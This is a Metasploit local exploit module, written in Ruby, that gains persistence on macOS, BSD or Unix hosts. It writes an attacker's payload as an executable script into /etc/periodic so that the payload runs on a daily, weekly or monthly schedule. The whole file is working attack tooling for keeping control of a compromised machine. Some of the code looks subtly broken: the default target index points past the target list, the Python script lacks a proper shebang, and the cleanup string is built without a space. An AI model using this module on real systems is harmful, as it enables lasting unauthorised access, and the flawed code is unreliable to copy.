##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Periodic Script Persistence',
        'Description' => %q{
          This module will achieve persistence by writing a script to the /etc/periodic directory.
          According to The Art of Mac Malware no such malware species persist in this manner (2024).
          This payload requires root privileges to run. This module can be run on BSD, OSX or Arch Linux.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'gardnerapp',
          'msutovsky-r7'
        ],
        'References' => [
          [
            'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf',
            'URL', 'https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and-cron-on-os-x/'
          ]
        ],
        'DisclosureDate' => '2012-04-01',
        'Privileged' => true,
        'Platform' => %w[bsd unix osx],
        'Targets' => [
          [ 'OSX', { 'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64], 'Platform' => 'osx' } ],
          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ],
          [ 'Unix', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ],
          [ 'Bsd', { 'Arch' => [ARCH_X86, ARCH_X64], 'Platform' => 'bsd' }]
        ],
        'DefaultOptions' => {
          'DisablePayloadHandler' => true
        },
        'DefaultTarget' => 4,
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptEnum.new('PERIODIC_DIR', [true, 'Periodic Directory to write script eg. /etc/periodic/daily', 'daily', %w[daily weekly monthly]]),
      OptString.new('PERIODIC_SCRIPT_NAME', [false, 'Name of periodic script']),
    ])
  end

  def check
    periodic = "/etc/periodic/#{datastore['PERIODIC_DIR']}/"

    return CheckCode::Vulnerable "#{periodic} is writable" if writable? periodic

    CheckCode::Safe "Unable to write to #{periodic}"
  end

  def write_periodic_script(payload_content)
    periodic_dir = "/etc/periodic/#{datastore['PERIODIC_DIR']}/"

    periodic_script_name = datastore['PERIODIC_SCRIPT_NAME'].blank? ? Rex::Text.rand_text_alphanumeric(rand(6..13)) : datastore['PERIODIC_SCRIPT_NAME']
    periodic_script = File.join(periodic_dir, periodic_script_name)

    @clean_up_rc << periodic_script.to_s

    fail_with(Failure::UnexpectedReply, "Unable to write #{periodic_script}") unless upload_and_chmodx(periodic_script, payload_content)

    print_status "Succesfully wrote periodic script to #{periodic_script}."
  end

  def exploit
    @clean_up_rc = 'sudo rm'

    if target['Arch'] == ARCH_PYTHON
      print_status 'Getting python version & path.'

      python = cmd_exec('which python3 || which python2 || which python')

      fail_with(Failure::PayloadFailed, 'Unable to find python version. ') if python.blank? || !file?(python)

      print_good "Found python path #{python}"

      payload_bin = "#{python}\n" + payload.encoded
    elsif target['Arch'] == ARCH_CMD
      payload_bin = "#!/usr/bin/env #{cmd_exec('echo ${SHELL}')}\n" + payload.encoded
    else
      payload_bin = generate_payload_exe
    end

    write_periodic_script payload_bin

    print_status("Cleanup command '#{@clean_up_rc}'")
  end
end
